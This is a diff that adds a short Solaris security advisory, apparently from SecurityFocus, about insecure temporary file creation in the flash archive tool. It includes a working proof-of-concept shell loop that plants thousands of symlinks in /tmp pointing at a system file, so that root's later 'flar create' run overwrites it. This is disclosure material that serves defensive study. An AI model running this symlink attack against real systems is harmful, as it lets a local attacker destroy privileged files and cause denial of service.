@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/41619/info
+
+Oracle Solaris is prone to an insecure temporary file creation vulnerability.
+
+A local attacker can exploit this issue to overwrite arbitrary files with the privileges of the affected process. This will likely result in denial-of-service conditions, other attacks may also be possible.
+
+Oracle Solaris 8, 9 and 10 are vulnerable. 
+
+
+   $ x=0
+   $ while [ "$x" -le 30000 ];do
+   > ln -s /etc/important /tmp/.flash_filter_one_.$x
+   > x=$(expr "$x" + 1)
+   > done
+
+Later, when root creates a flash archive with:
+
+   # flar create -n junk `pwd`/junk.flar
